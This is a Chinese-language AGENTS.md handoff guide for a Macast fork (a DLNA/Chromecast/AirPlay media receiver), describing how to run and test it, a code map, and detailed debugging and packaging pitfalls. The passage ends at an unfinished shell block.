# AGENTS.md — 交接说明（给后续 AI agent / 新协作者）

本文件是**接手这个仓库的第一入口**。它只写"怎么在这里干活、坑在哪、去哪找细节"，
不重复产品说明（见 `README_ZH.md`）和构建说明（见 `BUILDING.md`）。

本仓库是 **`pingod/Macast`**（上游 `xfangfang/Macast` 的分支）。Macast 是一个跨平台
**菜单栏 DLNA / Chromecast / AirPlay 接收端**：手机把媒体 URL 发过来，Macast 用 mpv 播放。

---

## 1. 30 秒跑起来

```shell
cd <repo>
./scripts/run-from-source.sh          # 从源码运行（会 unset PYTHONPATH，见 §5）
```

- 依赖：`.venv`（Python 3.12）+ `requirements/darwin.txt` + `pillow zeroconf pyperclip`。
- Web 设置页：<http://127.0.0.1:58880/>
- 日志：`~/Library/Application Support/Macast/macast.log`（**排障看这个，不是 stdout**）。
  每次启动清空，单文件 2 MB 轮转并保留 2 份备份；设置页「日志」只读末尾若干行（见 §4.10）
- 配置：`~/Library/Application Support/Macast/macast_setting.json`
- 用户插件目录：`.../Macast/renderer/` 与 `.../Macast/protocol/`

## 2. 改完必须做的两件事

```shell
# 1) 静态检查（能秒抓"删代码块时误删变量赋值"这类错误）
env -u PYTHONPATH .venv/bin/python -m pyflakes <改动文件>

# 2) 回归验证（2026-09-25 本机实测 1713/1719 通过，同一份代码在 Linux 容器里 1708/1714；2026-10-01 本机 1761/1767 —— 红的永远是下面那 6 条；**总数随环境伸缩**：场上有一个在跑的 Macast（占着
#    8009/58880，甚至 8443 —— 那会把 Part 19 的 4 条 TLS 用例换成 2 条"端口被占就静默降级"）时真实 socket 的那几段没跑就是没跑，套件不会替它承认。所以先看总数，
#    再信"全绿"；跑之前按 §4.2 杀干净实例。
#    **但这台机器上有一组永远红的**：Part 34（来源台账）的 6 条 —— 见 §4.12 末条，
#    那是这份克隆缺对象，不是台账漂移，**不要去手改 docs/Provenance.md 的数字凑绿**。
#    正因为这 6 条永远红，**CI 跑的是 `--ci`**（见 §6）：它只豁免 Part 34 那 6 条，
#    且豁免的前提（"台账在这里算不出来"）必须自己成立；别的位置变红、或这 6 条在
#    没有完整历史时反而变绿，都会红。发版流程里 `release` 现在等这个 job。）
env -u PYTHONPATH .venv/bin/python scripts/verify_cast_airplay.py
```

> 加新功能/修 bug 时**同时补用例**。这个仓库的验证脚本是唯一能防回退的东西。
> 验证套件把网络全部打桩，所以它**抓不到"真实发送端栈不认账"这类问题**——
> 那类问题要跑 `scripts/cast_conformance.py`（见 §6）。
> 同理它抓不到"应用根本起不来"：套件从不启动 `Macast.py`。跑真应用的是
> `scripts/e2e_smoke.py`（见 §6），它会在本机拉起**第二个** Macast 约 30 秒。

## 3. 代码地图

```
Macast.py                  入口（GUI / CLI 两种模式）
macast/
  macast.py                MacastApp（菜单栏）、MacastPlugin / MacastPluginManager（插件热插拔）
  server.py                CherryPy 服务、HTTP/HTTPS 通道、SSDP 生命周期
  protocol.py              DLNA 协议 + DLNAHandler（Web UI / 管理 API / 网页投屏入口都在这里）、api_token、PlaybackGuard
  protocol_group.py        ProtocolGroup：把多个协议伪装成一个，扇出 start/stop/set_state_*
  protocol_cast.py         Chromecast 接收端（mDNS + Cast v2 over TLS:8009 + setup HTTP:8008）
  protocol_airplay.py      AirPlay 接收端（mDNS + RTSP:7000，仅视频 URL）
  ssdp.py                  SSDP（DLNA 发现）；Sock.send_it 里的 LOCATION 走 Setting.get_ip()
  discovery.py             mDNS 广播（zeroconf），只广播可达地址
  utils.py                 Setting（含网卡枚举/选择）、环境准备、XML 路径
  plugin_repo.py           插件索引/仓库坐标（唯一来源；当前索引为空，第一方插件已全部内置）；见 §4.6
  logsplit.py              按模块独立日志文件（logs/<Name>.log）；见 §4.10
  module_settings.py       「模块设置」面板：谁拥有哪个配置键（唯一来源）；见 §4.11
  mirror_view.py           「电脑投屏」tab 的派生层：把 screen_mirror 的 console_state 变成页面要显示的版式（纯函数，无网络无 UI）；见 §4.8
  gui.py                   跨平台菜单抽象（darwin: rumps；其他: pystray）
  plugins/renderer/        内置渲染器插件：iina / web / live / potplayer / pi_fm（5 个来自上游合集，vendored）
                              + macast_ytdlp / external_player / floating / hooks / cast_bridge / cast_local_file / screen_mirror（本 fork 自研）
  plugins/protocol/        内置协议插件：nirvana（NVA「哔哩必连」，vendored）+ raop / airplay_mirror（本 fork 自研）
  xml/setting.html         设置页（Vue2 + Element UI，**单文件内嵌模板**；
                           帮助弹层与页宽是对外文案，改能力要同步，见 §4.13）
plugins/                   插件索引目录（仓库根目录，与 macast/plugins/ 区分）；当前仅 info.json（空索引）+ README.md，第一方插件已全部内置；见 §4.6
macast_renderer/mpv.py     MPVRenderer：启动 mpv、走 IPC 收发、把 mpv 事件转成状态
scripts/                  见 §6（`provenance.py` 在里面：按 fork 点度量每一行是谁写的，署名与它对齐；见 §4.12）
docs/                     见 §7
```

## 4. 这个仓库踩过的坑（**最重要的一节**）

这些都是真机/真实网络才暴露的，且每一个都曾经以"看起来像别的问题"的形式出现。
改相关代码前先读对应条目，细节见 `docs/Cast-AirPlay-Testing.md`。

### 4.1 Chromecast 相关

| 症状 | 真因 | 修复要点 |
|---|---|---|
| 能搜到、点投屏没反应 | mDNS 把**所有**本地 IPv4（虚拟机网桥、Tailscale）都发成 A 记录，发送端随机挑到不可达地址 | 只广播承载 IPv4 默认路由的网卡（+ 用户显式选择）；见 `discovery.py` |
| 同上 | `RECEIVER_STATUS` 的 `applications[].namespaces` 必须是**对象数组** `[{"name": ...}]`，字符串数组会被 pychromecast / Cast SDK 拒收 | `_app_namespaces()` |
| VLC 连上后**一个字节都不再发** | device-auth 回复必须是 `DeviceAuthMessage{response: AuthResponse{signature, client_auth_certificate}}`。这两个字段是 `required`，裸发 `AuthResponse` 会让 VLC 的 `ParseFromString()` 失败并 `return`，状态机永远停在 `Authenticating` | `encode_auth_response()` |
| 设备仍被广播、8009 仍 `LISTEN`、TCP 能连，但 TLS 握手永远超时 | **`except OSError: break`**：`ssl.SSLError` 是 `OSError` 子类，某次失败握手把 accept 循环整个干掉了 | 明文监听 + 每连接 `wrap_socket`；循环里区分"监听器没了"与"单条连接失败" |
| 有声音没画面 | 先看 `video-reconfig`（见 §5 排查手法），多数是**发送端只推了音频**（VLC 的 `--sout-chromecast-video` 关掉时 `Add()` 丢弃所有非音频 ES） | `protocol_cast.py` 记录 `contentType` 供判定 |
| 连上了但什么都没播 | mpv 继承了 `http_proxy`，局域网地址也走代理 → `HTTP error 502` | `Setting.get_system_env()` 对播放器摘掉代理变量 |

### 4.2 通用陷阱

- **`Setting.get(key, default)` 有副作用**：读不存在的 key 会把 default 写进内存 dict 并持久化。
  判断存在性用 `Setting.has()`，删除用 `Setting.unset()`。
- **`setting.html` 在 `Handler.__init__` 里被 `load_xml` 缓存**：改前端模板**必须重启应用**才生效，
  否则会以为"改了没效果"。
- **`ProtocolGroup` + 基类同名空方法**：`Protocol` 自己定义了 `set_state_*` 空方法，
  所以扇出函数必须装到**实例属性**上才能盖过类方法（否则状态静默丢弃）。
- **同一族陷阱同样吃掉读接口**：`Protocol` 还定义了 `get_state` / `get_state_*` /
  `set_state` 的空实现。`ProtocolGroup` 不覆盖它们，基类的桩就会赢，**永远不转发**给
  真正持有播放状态的 `DLNAProtocol`。症状是"状态页全空"：标题、音量、进度全是空串，
  前端显示 `—` / `0` / `0:00:00` 且永不刷新；字幕显隐开关也一直读到 `''`。
  修法是 `ProtocolGroup._install_state_methods()` 里对 `set_state*` 装扇出、
  对 `get_state*` 装委托（`_delegate_getter`），并且**不要**只按 `set_state_` 前缀筛
  （裸 `set_state` 没有尾随下划线，漏掉它 mpv 的轨道/音量更新就丢了）。
  回归用例在验证套件 Part 6 末尾（`_Rec` 那种不继承 `Protocol` 的假对象抓不到这个 bug，
  必须用真的 `DLNAProtocol`）。
- **`ProtocolGroup.primary` 决定 CherryPy 树根**：它按 `handler_priority` 取最大值。
  某个协议的 handler 若**继承**了另一个协议的 handler（NVA 继承 `DLNAHandler`），
  它必须声明更高的优先级，否则按加入顺序 DLNA 会赢，NVA 的 SETUP/RESTORE 端点
  全部静默不可达。
- **`event_subscribes` 用 `ProtocolGroup.event_subscribes` 聚合**（属性，跨所有子协议合并），
  别再退回 `getattr(protocol, 'event_subscribes', {})`——那只会问到 primary 一个子协议。
- **订阅者必须"没有状态变更也能入表"**：`add_subscribe` 只是把客户端压进
  `append_device_queue`，真正写进 `event_subscribes` 的是**事件线程**。而排空这个队列
  原先只在 `send_states_to_clients()` 里做，那个调用又被 `state_queue` 非空门控。
  DLNA **故意不 observe 播放位置**（位置靠客户端轮询 `GetPositionInfo`），
  所以"视频稳定播放中"时 `state_queue` 一直为空 ⇒ 冷启动后**第一个订阅者永远不进表**，
  设置页「客户端信息」一直显示"暂无订阅客户端"。
  修法：事件线程每轮无条件 `_reap_timed_out_clients()` + `_sync_subscribe_list()`。
  排查现成工具：`curl 'http://127.0.0.1:58880/api?query=subscribers'` —— 按子协议列出
  `subscribed` 与 `pending_append`；**非零 `pending_append` 就是队列没被排空**。
- **`event_subscribes` 是**发布**出去的，不是就地改的（copy-on-write）**：单写者是事件线程，
  它构建新 dict 后**一次赋值**发布；每个读者**把属性绑定一次**再迭代那份快照。
  谁要是往 `self.event_subscribes[...] = ...` / `.pop()` / `.clear()` 这条路回去，
  CherryPy worker 上的读者就会撞 `RuntimeError: dictionary changed size during iteration`。
  两条读路径都用真线程复现过（2026-09-25）：状态页那条合并表读 **8 秒 110 次**（被 try/except
  吃掉 ⇒ 页面「客户端信息」整块消失，症状长得像上一条旧病），`add_subscribe` 那条
  **20 秒 148,302 次**且**没人兜** ⇒ 控制点吃 **HTTP 500**，此后它不再收事件，
  用户读到的是"投屏后进度条不再动"。**这一格是我们的问题不是发送端的**。
  **为什么不是加锁**：`send_states_to_clients` 的迭代横跨对每个订阅者的网络 I/O
  （`HTTPConnection(host, timeout=5)`），一把锁等于让一个死掉的客户端把 SUBSCRIBE 处理按住一个
  connect timeout。同一条路上顺手收掉的两处：`renew_subscribe` 改 `.get()`（sid 在脚下消失时
  回 **412** 而不是抛 `KeyError`），以及 `ObserveClient.__init__` 里那行 `print(self.host)` 删掉
  （每次订阅往没人读的 stdout 写一行；Windows 窗口版根本没有 stdout，见 Part 41）。
  回归用例 **Part 49**（29 条：发布契约 + 五条读路径各自对打一个真在 churn 的写线程 +
  两条"不许再出现就地扩容"的文本规则 + stdout 沉默），四个变异体各自红 8/1/1/1 条。
  细节见 `docs/architecture-review-2026-09.md` 的 R3「已修」。
- **`ProtocolGroup._delegate_getter` 对 `KeyError` 要静默**：状态页会问一批超集键名
  （如 `CurrentURI` 只是 AVTransport.xml 里的 action 参数，不是 stateVariable）。
  按 ERROR 记会变成"每次轮询 × 每个缺失键"各一条，把真问题淹掉。
- **DLNA 默认插件的真实标题是 `DLNA Protocol`**（由类名推导），持久化/比对一律走
  `MacastPluginManager.resolve_title()`，别硬编码 `"DLNA"`。
- **多协议并发时 `event_subscribes` 等 DLNA 专属属性要 `getattr(..., default)`**，
  否则只启用 Chromecast 时会抛 AttributeError。
- **CherryPy 工作线程改 AppKit 菜单不安全**：走 `App.call_on_main_thread()`。
- **多实例会把端口写歪**：旧实例占着 58880 时起新实例，端口回退会把 `ApplicationPort`
  改成随机值并重置 USN。起新实例前先杀干净（`lsof -nP -iTCP:8009 -sTCP:LISTEN -t`）。
- **SIGINT 杀得掉菜单栏 Macast，SIGTERM 杀不掉**（2026-09-21 实测，三次跑里三次一致）。
  Cocoa 事件循环不理会 `SIGTERM`，`kill <pid>` 之后进程照常监听 58880/8009。所以 §4.2 上面那条
  "起新实例前先杀干净"**必须是 `kill -2`**（或走菜单），`scripts/e2e_smoke.py` 的信号升级顺序
  也因此是 SIGINT → SIGTERM → SIGKILL 而不是 SIGTERM 优先。附带一条更烦的：**信号退出跳过
  `MPVRenderer.stop()` 的收尾**，空闲的 mpv 会留在场上（三次跑里两次如此，本机另有 5 个
  `ppid=1`、活了 1–3 天的 mpv 佐证）——被反复重启的 Macast 会**攒播放器**。清理用
  `lsof -nP -iTCP:<port> -sTCP:LISTEN -t` + `pgrep -f <ipc socket path>`，`ps` 在这台机器的
  CLI 沙箱里不可用（见 §5）。
- **`mpv --http-proxy=` 不能替代摘环境变量**，ffmpeg 的 HTTP 层仍然读 `http_proxy`。
- **假命令行工具的输出，必须是真工具在这台机器上的逐字输出**。`screen_mirror` 的采集探测要问
  `ffmpeg -f avfoundation -list_devices true -i ""` 有哪些设备，而那段解析是按一个**从未存在过的
  格式**写的：它找大写 `Video devices:` 且只取双引号里的名字，真实输出是小写
  `AVFoundation video devices:` 且设备名**不带引号**（`[0] OBS Virtual Camera`）。结果真 Mac 上
  两个列表永远为空、镜像从 v0.1 起就起不来 —— 而验证套件全绿，**因为 Part 21/22/23 的假 ffmpeg
  抄的就是那个虚构格式**：测试和实现共享同一个错误假设时，用例数为零。现在 Part 31 用真机输出喂解析器，
  并反过来扫测试文件自己：`-list_devices` 回答里出现"带引号却没有索引"的设备行就变红。
- **rumps 0.4.0 自己一次都不做主线程派发**（`rumps/rumps.py` 里 `callAfter` 出现 **0 次**），
  所以 `rumps.notification`、`Menu.clear`、`insertItem_atIndex_`、`MenuItem.title=` 全部**在调用它的那个线程上
  直接操作 AppKit**。用户报的"菜单有时要点好几次，点一次就又消失了"就是这个：正在 tracking 的 NSMenu
  一旦在别的线程被改动，AppKit 立刻收起菜单，那一次点击作废。症状只在**用户正握着菜单的时候**别处发生了
  UI 写入时出现，所以它时好时坏。这条同时解释了 §4.2 里"协议开关不许整表重建"那条注释为什么必要。
  两处违规已修（套件 **Part 47** 钉住，24 条，两个变异体各自变红）：
  ① `App.notification` —— 它挂在 `cherrypy.engine.subscribe('app_notify', …)` 上，而全仓有
  **52 处 `publish('app_notify', …)`**（`macast/` 49 + `macast_renderer/mpv.py` 3），来自 CherryPy 工作线程、mpv 的 IPC 线程、镜像线程；这个数字**由 Part 47 用 AST 现场数出来，再反过来比对写它的两处散文**（本条与 Part 47 自己的头注释），抄错的数字当场变红 —— `grep` 数出来的是 47，因为它既看不见跨行写的调用、也数不清被注释掉的旧报告。现在 Darwin 分支
  走 `call_on_main_thread`（pystray 分支**故意不动**：§4.8 那条"通知失败不许吃掉 teardown"的契约是按
  它就地抛/就地截断写的）。
  ② `Macast.update_service_status` —— cherrypy 的 `start`/`stop` 钩子跑在 **SERVICE_THREAD**
  （`server.run_async` 就是在别的线程上 `engine.start()` 的），而它写 `toggle_menuitem.text`
  ＝`NSMenuItem setTitle_`，也就是**用户点服务开关的那一瞬间**从后台改菜单。
  **`gui.MenuItem` 的 `text/checked/enabled` setter 本身就是未经保护的 AppKit 写**（view 已经挂上时），
  新加写入点的人必须给出"我为什么在主线程上"的理由：Part 47 因此扫 `macast.py`（七处，逐条登记理由：
  菜单回调、构建期还没有 view、已经走队列的 `_refresh_ip_menu`/`update_service_status`）
  与 `macast/plugins/**`（只许 `build_menu*`/`on_*` 这两种名字）。
  两条顺带记下的机理：`performSelectorOnMainThread:waitUntilDone:NO` 只在**默认 run-loop mode** 派发，
  所以菜单开着时排队的改动会**等用户松手**才落地（这正是我们要的方向：它不再从光标底下抽走菜单）；
  而**循环还没起来时**排队的改动会在 `App.run()` 起来后立刻执行 —— 已用真机探针验过（`app.run()` 之前
  从 `SERVICE_THREAD` 排的notification 与 setTitle_ 都在 `MainThread` 落地，
  真 `NSUserNotificationCenter` 接受这一条延后调用），所以启动横幅不会被打桩测试"测出来的一条假绿"吞掉。
- **`import pystray` 在没有 X 显示的那台机器上会抛 `Xlib.error.DisplayNameError`，不是 `ImportError`**。
  `pystray` 的包 `__init__` 会挑一个后端，而 `pystray/_xorg.py` 在**模块作用域**就调
  `Xlib.display.Display()`。所以 `macast/gui.py` 顶部一旦 `import pystray`，
  **整个 `import macast.macast` 就被毒掉** —— 而 `macast.macast.cli()` 从来不建托盘，
  它只跑 `Service(...)`。后果是 README_ZH 写明的 Linux 入口 `macast-cli`
  在一台无头服务器上**根本起不来**（`ModuleNotFoundError` 都不会有，报的是 Xlib 那一句），
  而本机是 macOS 走 rumps、验证套件又从不 import `gui.py` 的 pystray 分支，所以**没有红过**。
  现在 `gui.py` 只在真要建托盘时经 `_pystray()` 惰性导入。Part 50 三面守着：
  ① AST 扫 `macast/*.py` 与 `macast_renderer/*.py` 的模块作用域 import，出现
  `pystray`/`Xlib` 即红（并断言扫到的文件数 > 10，免得扫描本身空转）；
  ② 子进程真的**删掉 pystray**（meta_path 拦截器）、不设 `DISPLAY`、`sys.platform='linux'`，
  再 `import macast.macast` 并确认 `cli` 可调用 —— 外加变异体：把模块级 `import pystray`
  拼回去，这一条必须红（拦截器自己会报告"确实拦到了"，否则这条用例是假的）；
  ③ 用 `_pystray()` 的三处调用点必须先绑定 `pystray = _pystray()` 再用。
  **同一族陷阱也打在套件的桩上**：Part 5 那两处 `try: __import__("pystray") except ImportError`
  在无头 Linux 上接不住 `DisplayNameError`，于是 `macast_mod` 从未定义，
  于是文件后面（现 verify_cast_airplay.py:2166）那行模块级的
  `macast_mod.SETTING_DIR` 让**整个套件在打印任何结论之前死掉**。
  CI 正是这么跑的（没有 display），所以那两处已改成 `except Exception`。
  这里刻意**没有**给热插拔那约 200 行加"跳过"守卫：响的崩溃会诚实地挡住 CI，
  静默的跳过才是"不提问的检查等于通过的检查"。
- **`_wait_until(lambda: os.path.exists(那个文件))` 之后再去读内容，是读半份文件**。
  假二进制的 argv 用的是 `printf '%s\n' "$@"` —— **一个参数一行**，所以"文件存在"发生在
  第一行刚落盘时，而不是全部落盘时。macOS 上进程起得慢到恰好躲开，Linux runner 上
  Part 9 那条"配置文件就是二进制被指过去的那份"读回来的 argv **只有 `-v`** 并当场变红
  （`--ci` 正确地拒绝了它：这是 Part 34 之外的红）。判据改成**等那个事实**
  （`_wait_until(... and config9 in open(...).read())`），Part 9/14/26 三处同一形状一起改。
  **同一族的第二种形状是"等一个事件的副作用"**：Part 24 里"这一路不挂 HTTP 服务"那条
  断言读的是 `_sink`/`_server`/`playing_url()`，而 OFFER 按设计**早于**编码器与服务存在
  （低延迟通道被设备拒绝时不许先养一个 ffmpeg 再拆，见 §4.8），所以"设备看见 OFFER 了"
  并不蕴含"会话已经把 sink 交出去"—— 同一份代码在 Mac 上过、在慢一点的 runner 上红
  （`server=None sink=None url=''`）。判据同样是**等那个状态**（20 秒上限）而不是抓一瞬间。
  这条和 §4.2 末条、§4.13 的"假 ffmpeg 抄虚构格式"是同一族：**测试自己的实现也是实现**，
  只在非 macOS 机器上才现形的那一半，只有那个 Linux `verify` job 看得见（见 §6）。
- **写文件的代码要自己把目录建出来**（2026-09-25：§4.2 上一条预告的那个 job，第一次真跑就抓住一条**产品 bug**）。
  `Service._ensure_self_signed_cert()` 让 openssl 往 `SETTING_DIR/macast.key` 写，而那个目录在此之前
  **只有 `Setting.save()` 会建**。一台干净机器上（GitHub runner、刚装 Macast 的用户）它不存在 ⇒
  openssl 非零退出 ⇒ 生成器回 `(None, None)` ⇒ `ChromecastProtocol._ensure_cert()` 交出一个不存在的路径
  ⇒ `ssl.load_cert_chain` 抛 `FileNotFoundError`，**Cast 的 TLS 接收端在真 8009 上根本没有起来**。
  而日志里唯一那行说的是 `-addext unsupported` —— 那是旧代码对**任何**非零退出的猜测，
  它把真实原因（目录不存在）盖掉了，症状（"Chromecast 搜得到投不上"）会长得像一个协议 bug。
  三层收口：① 生成前 `os.makedirs(SETTING_DIR, exist_ok=True)`，建不出来就指名那个目录并拒绝；
  ② 新增 `_openssl_error(exc)`，把 **openssl 自己打印的 stderr 第一行**带进重试 warning 与最终 error
  （`subprocess.run(check=True)` 抛出的异常 `str()` 只有命令行和退出码，等于没说）；
  ③ 套件的 Part 3 现在把 `utils.SETTING_DIR` / `cast.SETTING_DIR` / `server.SETTING_DIR` 一起改指临时目录 ——
  因为在那之前，那段真 socket 端到端**一直在往用户真实的配置目录写 `macast.key` / `macast_cast.crt`**，
  正是 §10 第一条明令禁止的事（而它全绿了这么久）。
  **两个变异体各自变红，红法不同且都对**：删掉 `makedirs` ⇒ 8 条红（3 条新用例 + 5 条 cast e2e/mDNS，
  也就是"整段 Cast 接收端死了"这件事本身）；只把两条日志消息改回旧写法 ⇒ 恰好 2 条红。
  顺带记一条**测试自己的谎**：失败路径那两条消息的用例，第一版把生成器指向了**上一轮已经写好证书**的目录，
  于是它走"文件已存在"的早退分支、返回旧路径、一条日志都不发 —— 用例对着"什么都没有发生"点了两个绿勾。
  现在用一个仍然为空的第二目录，并要求这次调用**真的**返回 `(None, None)` 才算数。
- **夹具脚本里的字符串拼接，那对括号是承重的**（2026-10-02）：Part 55 那几段假 ffmpeg 由
  `(r"""…""" + _avf_body55 + r"""…""").replace("@RECEIPT@", _rec)` 拼出来，**括号不能省** ——
  省掉之后 `.replace` 只绑到**最后一段**上，于是第一段写出的 argv 行落进一个**字面叫 `@RECEIPT@`
  的文件**（就在 CWD 里），而 `GOT12`/`AUD1920` 去了真 receipt。为读一份永远不可能含那行的 receipt
  花掉**四趟全套件**；断言详情印的是 `[]`，读起来恰好像一次计时竞态，而它不是。
  这是"假 ffmpeg 抄虚构格式"（§4.2 上面那条）与自己人打自己人的同一族：**测试自己的代码也是实现**，
  拼错的方式在真机器上照样是"静默地什么都没测"。
- **回落路径会在 spawn 后一两毫秒里拆掉那个 ffmpeg，比 POSIX shell 跑到第一行 `printf` 还快**
  （2026-10-02 实测：48 个 shell 各拿到 0–5 毫秒的先手，**没有一个**写下自己那一行）：Part 55 的 G 段
  （OS 在 start 时拒绝 SCK 流、avfoundation 接管）**允许 SCK 那次尝试自己的 argv 行缺席** ——
  它的拒绝记在 `feeder.start()` 里面，而重试路径转身就把那个进程拆了。证明"SCK 先走过"的
  不是那行 receipt，是那条 `ScreenCaptureKit gave no frame (...)` warning（它只可能在一次成功的
  `Popen` 之后发出）加上 `_calls55['n'] == 1`；receipt 在 avfoundation 那一段仍被完全信任
  （同步探测 + 长寿 start），以及"绝不许出现的东西"（管道 token）也靠它。
  **偶尔真跑进来的那半行**必须仍然排在 avfoundation 探测之前，否则它描述的次序就不是这个故事的次序。

### 4.3 打包（v0.7.11 的产物曾经**全部无法启动**）

**症状**：`.app` / Linux / Windows 产物双击或运行后立刻退出，日志里是
`ModuleNotFoundError: No module named 'zeroconf'`（或 `... 'zeroconf._services' is not
a package`）。**源码运行完全正常**，所以很容易漏掉。

**两个原因，都要记住：**

1. **依赖列表写了多份然后漂移。** `zeroconf`（mDNS 广播，`macast/discovery.py` 顶层
   import）被加进了代码和 `requirements/common.txt`，但 **没**加进
   `requirements/darwin.txt`、`scripts/build_macos_arm.sh` 的内联 pip 列表、
   CI 里 4 个 job 各自的内联 pip 列表、以及 `setup_py2app.py` 的 `includes`。
   于是构建环境里根本没有它，py2app 看不到这个 import，产物就缺。
   → 现在 **`requirements/darwin.txt` 是唯一来源**（本地构建脚本也改为 `-r` 它）。
   加新依赖时，请同时检查：`requirements/*.txt`、CI 各 job、`setup_py2app.py`、
   pyinstaller 的 `--collect-all/--hidden-import`。

2. **`zeroconf` 不能只写进 `includes`，必须写进 `packages`。** 它同时发布 Cython
   编译产物和 `.py` 源码，而 `zeroconf/_services/__init__` 正是编译版。modulegraph
   会把 `zeroconf._services` 当成**单个扩展模块**（叶子节点）而不再下钻，包内于是
   只有 `lib-dynload/zeroconf/_services.so`、没有 `_services/` 目录：
   `ModuleNotFoundError: No module named 'zeroconf._services.info'; 'zeroconf._services'
   is not a package`。`packages` 是整目录拷贝，才能带上子模块；顺带把
   `ifaddr`（zeroconf 的唯一运行时依赖）也放进 `packages`。

**排查手法**（比读 build 配置快）：

```shell
# 1. 直接跑包里的可执行文件，看真实报错（不要只看 CI 绿）
env -u PYTHONPATH /Applications/Macast.app/Contents/MacOS/Macast
# 2. 确认可疑包是否真在包里（py2app 会把纯 Python 部分塞进 lib-dynload 或 zip）
find /Applications/Macast.app -iname "*zeroconf*" | head
```

**教训：CI 全绿 ≠ 产物能用。** 发版后一定要把下载下来的产物**真正启动一次**并确认
它监听了 8009/58880、`/api?query=status` 能返回版本号（见 §8）。

**反面的一半也成立：CI 全红 ≠ 代码坏了。** 2026-09-21 发 v0.7.15 时四个平台 job 全红，
但**只红在 `Upload artefact` 这一步**（构建 / arm64+i18n 校验 / 签名 / 打包 zip 全绿），
报错 `Failed to CreateArtifact: Artifact storage quota has been hit` ——
四处 `retention-days: 14` × 每次约 170 MB × 免费方案 500 MB 上限，从 9 月 14/15 那两波密集构建起
就一直撞（193 份 / 8.2 GB），与本次改动无关。修法是先删旧 artefacts 再把留存改成 **2 天**（`7012268`），
然后 `gh run rerun --failed` 重跑同一个 run（保留 tag 上下文，不用重推 tag）。
**Releases 的产物不受影响**：那是另一个桶，删 Actions artefacts 不会动到已发布版本的下载链接。
所以看 CI 失败时**先定位到哪一步**再判断是谁的锅；这一步红的修法（清存储）和代码红的修法（改代码）
完全不同，撞错了方向会白改一遍代码。

**改 2 天留存只是把墙推远，没有拆掉它**（2026-09-25 又撞一次：84 份 / 3.5 GB）。
算术很直白：一次四平台构建约 170 MB，免费方案上限 500 MB，所以**留存窗口内只要跑过三次构建就必然撞**，
而密集开发期一天就能推三次。更具体的一笔账：改之前那四个 `Upload artefact` 步骤是**无条件**的，
所以**每一次普通 main push 也都往 Actions 存储里放四份产物** —— 最近 27 次构建里 **14 次是主分支构建**
（另外 13 次是 tag），而主分支构建的那 ~2.4 GB 没有任何读者。
现在的做法是两道一起上，都在 `build.yml` 里，并由套件 **Part 46** 钉住：

- **四个 `Upload artefact` 步骤带同一个门**：只有 tag push 与 `release=true` 的手工 dispatch 才上传。
  普通 main push 照样四平台全构建，只是**不往 Actions 存储里放东西**——它没有读者。
  要一次性主分支构建就 dispatch `release=true`（或推个 `v*.*` tag）。
- **`Free artefact storage` job 在 Release 发布成功后按 id 删掉本轮 artefacts**。
  它**故意不在 release 失败时跑**：那种情况要用 `gh run rerun --failed` 只重跑 release 那一个 job，
  而它会下载本轮的 artefacts；提前清扫就把"一步重试"变成"四平台重建"（§4.3 上面那条经验的反面）。
- 留存 2 天降级为**兜底**（清扫 job 自己失败时）。

**注意 Releases 与 Actions 是两个桶**（v0.7.15 → v0.8.10 十二个版本的四个产物都在 Releases 里活得好好的，
同时 Actions 是满的），所以这套清扫**不会**动到任何人的下载链接。
Part 46 的三条变异体已逐个验过：改开一个门 / 删 `actions: write` / 把清扫放宽成 `always()`，
各自都会当场变红。

**查产物里有没有某个模块，要用点号名，而且 Linux 产物故意不含 pystray**（2026-10-02 验 v0.9.0
时差点报出一个假缺陷，两条都记在这里）：

- **Linux / Windows 产物是 PyInstaller `--onefile`**，`tar tzf` / `zipfile.namelist()` 只会给你
  **3 个条目**（LICENSE、README、那一个可执行文件），列不出内容。可行的办法是把可执行文件
  `strings -a` 出来再 grep —— PyInstaller 的 TOC 里模块名是明文。**但名字是点号形式**：
  搜 `PIL/Image` 得 0，搜 `PIL.Image` 得 15（Linux 与 Windows 一样多）。
  我第一遍用斜杠搜，据此差点断言"Linux 产物缺 Pillow ⇒ `gui.py` 模块级 `from PIL import Image`
  会毒掉 `import macast.macast` ⇒ 整个 Linux CLI 起不来"。**那条推理链是对的，前提是假的** ——
  所以报警之前先把 grep 模式验一遍（§10 那条"先拿证据再动手"同样适用于自己的探针）。macOS 产物不是 onefile，`Contents/Resources/lib/python3.12/` 下能直接 `ls`
  （`zeroconf/`、`zeroconf/_services/`、`ifaddr/` 都是真目录 = §4.3 那条修复还在），
  其余纯 Python 依赖在 `Contents/Resources/lib/python312.zip`（注意这一层，不在 `python3.12/` 里面）。
- **Linux 产物搜不到 `pystray`（0 次），Windows 有（13 次）—— 这是设计，不是漏装。**
  `build.yml` 那个 job 的标题就写着 *"Linux x86_64 — headless CLI, packaged as a standalone binary"*，
  pip 列表里也从来没有 pystray。它能成立**全靠 §4.2 那条惰性 `_pystray()`**，而这条恰恰是
  Part 50 在 CI 的 Linux runner 上用子进程真的验过的（meta_path 拦掉 pystray + `sys.platform='linux'`
  → `import macast.macast` 且 `cli` 可调用）。所以"Linux 产物没有 pystray"这句话有两层证据，
  别把它当成待修的缺失；反过来，**谁要是把 `import pystray` 提回 `gui.py` 模块顶层，
  Linux 产物就真的起不来了**，而抓得住它的只有那个 CI job。

### 4.4 `macast/plugins/**` 的"动态导入"打包坑（与 §4.3 同族）

内置插件（IINA / Web / Live / PotPlayer / PIFMRDS / NVA，来自
`xfangfang/Macast-plugins`）**从来不用静态 `import` 引入**：
`MacastPluginManager._load_bundled_plugins` 用 `os.listdir` 拼出 dotted path
再 `importlib.import_module`。**任何依赖扫描器都看不见它们**，所以产物里静默少一个
插件时，源码运行一切正常。

必须同时改三处，少一处就漏：

| 位置 | 要写什么 |
|---|---|
| `scripts/setup_py2app.py` | 加进 **`includes`**（见下） |
| `.github/workflows/build.yml` | 3 个 PyInstaller job 各加 6 个 `--hidden-import=` |
| 新增第三方依赖时 | `requirements/*.txt`（见 §4.3） |

**两套打包工具的选项名不一样，混用会直接让构建失败：**

- py2app 认 **`includes`**；传 `hiddenimports` 会报
  `error: error in setup script: command 'py2app' has no such option 'hiddenimports'`。
- PyInstaller 认 **`--hidden-import=`**（没有 `includes` 这个 CLI 选项）。

我就在这上面栽过一次：源码 206/206 全绿，`bash scripts/build_macos_arm.sh` 直接失败。
**所以改打包配置后一定要真跑一次构建**，别只看测试。

`packages: ['macast']` 会把目录整份拷进去（插件源码散落在
`Contents/Resources/lib/python3.12/macast/plugins/`），其余纯 Python 依赖被 py2app 打进
`lib/python312.zip` —— 所以**别用 `find` 找散文件来判断依赖在不在**，会误判成"缺失"。
正解是查 zip：

```shell
